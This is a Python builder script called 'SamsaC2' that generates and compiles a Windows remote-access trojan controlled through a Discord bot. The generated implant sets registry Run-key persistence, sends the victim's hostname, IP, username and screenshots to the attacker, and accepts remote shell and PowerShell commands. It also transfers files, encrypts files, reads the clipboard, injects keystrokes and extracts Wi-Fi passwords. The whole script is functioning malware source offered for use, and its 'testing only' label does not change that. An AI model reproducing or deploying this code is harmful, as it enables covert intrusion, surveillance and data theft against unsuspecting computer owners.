banner = '''
 _____                           _____  _____ 
/  ___|                         /  __ \\/ __  \\
\\ `--.  __ _ _ __ ___  ___  __ _| /  \\/`' / /'
 `--. \\/ _` | '_ ` _ \\/ __|/ _` | |      / /  
/\\__/ / (_| | | | | | \\__ \\ (_| | \\__/\\./ /___
\\____/ \\__,_|_| |_| |_|___/\\__,_|\\____/\\_____/
                                              
                                              


'''
import os
print(banner)
print("[+] Developed by Avyukt Security")
while True:
    x = input("\t\n[+] Press 'Enter' to generate payload: ")    
    token = input("[i] Enter token of the discord bot>> ")
    prefix = input("[i] Enter the desired prefix>> ")
    exe_name = input("[i] Enter name of the compiled executable file>> ")
    server_name = input("[i] Enter name of the discord server>> ")
    cryp_key = input("[i] Enter the key for file encryption/decryption>> ")

    
    x = (r"""
from nextcord.ext import commands 
import nextcord
import sys, os, pyautogui, socket, platform, requests, time, asyncio, aiohttp
import samsac2, webbrowser, subprocess
from random import randrange
from time import sleep
import time

token='{0}'

intents = nextcord.Intents.default()
intents.guilds = True
intents.members = True

intents.message_content = True
bot = commands.Bot(command_prefix='{1}', intents=intents, help_command=None)

tmp = samsac2.tmp
try:
    public_ip = requests.get('https://api.ipify.org').text
except Exception as e:
    None
exe_name='{2}'
exe_path = os.environ['appdata'] + "\\exe_name.exe"

os.system("copy exe_name.exe" + exe_path + " /y")
os.system('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Windows /t REG_SZ /d ' + exe_path+ " /f")


@bot.command(name="help")
async def help_command(ctx):
    embed = nextcord.Embed(title="SamsaC2 - Help Menu",
        description="List of available administrative commands.",
        color=nextcord.Color.blurple())
    embed.add_field(
        name="Shell",
        value="`cmd [command]` - Execute shell command\n"
        "`cd` - Change directory",
        
        inline=False
    )
    
    embed.add_field(name="System / Process",
        value=(
            "`ps [Powershell Command]` - Execute powershell\n"
            "`tasklist` - List active tasks\n"
            "`stoptask [taskname]` - Stop a running task\n"
            "`quit` - Close remote session"),inline=False)
    embed.add_field(name="File Transfer",
        value=(
            "`send` - Send file to client\n"
            "`recv [file_path]` - Receive file from client"
        ),inline=False)
    embed.add_field(
        name="Cryptography",
        value=(
            "`encrypt [file]` - Encrypt a file\n"
            "`decrypt [file]` - Decrypt a file"
        ),
        inline=False)
    embed.add_field(
        name="UI / Interaction",
        value=(
            "`hide [file/dir] [file]` - Hide File or Directory\n"
            "`unhide [file/dir] [file]` - Unhide file or Directory\n"
            "`press [key]` - Simulate key press\n"
            "`type [string]` - Type a string\n"
            "`clipboard` - Access clipboard\n"
            "`ss` - Take screenshot\n"
            "`web [url]` - Open URL\n"
            
        ),
        inline=False
    )
    
    embed.set_footer(text="Testing Environment Use Only")
    await ctx.send(embed=embed)""".format(token, prefix, exe_name))+r"""

sspath = f"{tmp}\\ss1.png"
hostname=socket.gethostname()

@commands.check
async def channel_check(ctx):
    if ctx.channel.name != hostname.lower():
        return False
    return True
@bot.event
async def on_ready():
    
    guilds = {}
    for guild in bot.guilds:
        guilds[guild.name] = guild.id"""+("""
    testing_guild = "{}"
                                          """.format(server_name))+r"""
    if testing_guild in guilds.keys():
        guild = bot.get_guild(guilds[testing_guild])
        channels = {}
        # for loop to check if a channel exists or not
        for channel in guild.channels:
            hostname = socket.gethostname()
            channels[channel.name] = channel.id
        channel_keys = list(channels.keys())
        if hostname.lower() in channel_keys:          
            global channel_id
            channel_id = channels[hostname.lower()]
        else:           
            await guild.create_text_channel(name=hostname)
            for channel in guild.channels:
                channels[channel.name] = channel.id
                channel_id=channel.id
                
    
    channel = bot.get_channel(channel_id)
    pyautogui.screenshot(sspath)
    x = nextcord.Embed(
        title = "Incoming connection!",
        color=nextcord.Color.green()
    )
    x.add_field(name=f"Hostname", value=f'{socket.gethostname()}')
    x.add_field(name=f'Public IP', value=samsac2.public_ip)
    x.add_field(name="User", value=f'{os.getlogin()}')
    x.add_field(name=f"Platform", value=f'{platform.platform()}', inline=False)
    x.add_field(name=f"Architecture", value=f'{platform.machine()}')
    x.add_field(name=f"Processor", value=f"{platform.processor()}")

    await channel.send(embed=x)
    await channel.send(file=nextcord.File(sspath))



@bot.command()
async def cmd(ctx, *, cmd):
    
    x = samsac2.cmd(cmd)
    if str(tmp) in x:
        await ctx.send(file=nextcord.File(x))
    else:
        await ctx.send(x)

@bot.command()
async def cd(ctx, *, file):

    try:
        samsac2.cd(file)
        await ctx.send(f'```Directory changed```')
    except Exception as e:
        await ctx.send(f'```{e}```')
    
######################################################
@bot.command()
async def ss(ctx):
    pyautogui.screenshot(sspath)
    await ctx.send(file=nextcord.File(sspath))


# file transfer
######################################################
@bot.command()
async def recv(ctx, *, file):

    try: 
        await ctx.send("```Receiving File, please wait...```")
        file = nextcord.File(file)
        await ctx.send(file=file)
    except Exception as e:
        await ctx.send(f"```{e}```")

@bot.command()
async def send(ctx, *, loc=""):
    
    await ctx.send("```Send the file now.```")
    def check(msg):
        return msg.author == ctx.author and msg.attachments
    msg = await bot.wait_for('message', check=check, timeout=30)
    attachment=msg.attachments[0]
    if loc == "":
        locs = f'{tmp}\\{attachment.filename}'
    else:
        locs =  f'{loc}\\{attachment.filename}'
    await attachment.save(locs)
    await ctx.send(f"```Saved file to : '{locs}'```")"""+(r"""
#############################################################
key=b'{0}'
@bot.command()
async def encrypt(ctx, *, file):
    
    try:
        samsac2.encrypt(file, key)
        await ctx.send(f'```Encryption successful```')
    except Exception as e:
        await ctx.send(e)

@bot.command()
async def decrypt(ctx, *, file):
    
    try:
        samsac2.decrypt(file, key)
        await ctx.send(f'```Decryption successful```')
    except Exception as e:
        await ctx.send(e)""".format(cryp_key))+r"""
##############################################################3
@bot.command()
async def clipboard(ctx):
    
    text = samsac2.clipboard()    
    await ctx.send(f'```{text.read()}```')

@bot.command()
async def type(ctx, *, content):

    pyautogui.typewrite(content, 0)
    await ctx.send(f"```Operation completed```")

@bot.command()
async def press(ctx, *, key):
    
    pyautogui.press(key)
    await ctx.send(f"```Operation completed```")


@bot.command()
async def web(ctx, *, text):
    
    webbrowser.open(text)
    await ctx.send(f"```Operation completed```")

@bot.command()
async def tasklist(ctx, *, task=""):
    x = samsac2.tasklist(task)
    if x == "File":
        await ctx.send(file=nextcord.File(f'{tmp}\\output.txt'))
    else:
        await ctx.send(f"```{samsac2.tasklist(task)}```")

@bot.command()
async def stoptask(ctx, *, task):
    await ctx.send(f'```{samsac2.stoptask(task)}```')
    
@bot.command()
async def ps(ctx, *, command):
    x = samsac2.ps(command)
    if x == "File":
        await ctx.send(file=nextcord.File(f'{tmp}\\output.txt'))
    else:
        await ctx.send(f"```{samsac2.ps(command)}```")

@bot.command()
async def hide(ctx, type, *, file):
    await ctx.send(f"```{samsac2.hide(type, file)}```")
@bot.command()
async def unhide(ctx, type, *, file):
    await ctx.send(f"```{samsac2.unhide(type, file)}```")
@bot.command()
async def wifip(ctx):
    x = samsac2.wifip()
    await ctx.send(f'```{x}```')



@bot.command()
async def quit(ctx):
    await ctx.send(f'```Exiting```')
    sys.exit()


while True:
    try:
        requests.get("https://1.1.1.1", timeout=5)
        bot.run(token)
    except KeyboardInterrupt:
        print("Stopping bot.")
        break
    except Exception as e:
        print("Connection failed or bot crashed:", e)
        time.sleep(30)





        """
    f = open(f'{exe_name}.py', 'w')
    f.write(x)
    f.close()
    print(f"[!] {exe_name}.py successfully generated!")


    exe_choice = input("\n[?] Press enter to compile the script into an executable>> ")
    print("\npython3 -m PyInstaller --noconsole --onefile {exe_name}.py")
    
    os.system(f"python3 -m PyInstaller --noconsole --onefile {exe_name}.py")

    print(f"[i] {exe_name}.exe successfully compiled! ")

    exit()
    
    
    

    
